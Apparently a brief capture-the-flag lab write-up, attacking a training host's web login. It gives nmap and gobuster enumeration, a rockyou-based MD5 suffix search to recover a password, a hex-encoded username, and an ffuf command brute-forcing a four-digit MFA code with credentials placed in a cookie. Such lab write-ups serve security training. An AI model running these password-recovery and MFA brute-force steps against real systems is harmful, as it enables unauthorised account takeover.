Enumeration
``` 
sudo nmap 10.10.229.253 -p- -sV -Pn -n --disable-arp-ping
``` 
 
```
 gobuster dir -u http://10.10.229.253/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,txt,html -t 100 -o gobuster_s1.txt

```


```
@fred I turned on php file syntax highlighting for you to review... jason
```

```
Many servers are configured to automatically highlight files with a phps extension. For example, example.phps when viewed will show the syntax highlighted source of the file.
```

Password termina em 001
```
while IFS= read -r line; do printf '%s' "$line" |md5sum | awk '{print $1}' | grep -E "001$" && echo $line && break ; done < /usr/share/wordlists/rockyou.txt

```

`define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74');`

```
ffuf -u 'http://10.10.229.253/console/mfa.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.229.253/console/mfa.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.10.229.253' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=6lne9nb2pck576cpr1kqr0e2aj; user=jason_test_account; pwd=violet' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d 'code=FUZZ' -w 4-digit-pin-list.txt -fw 183
```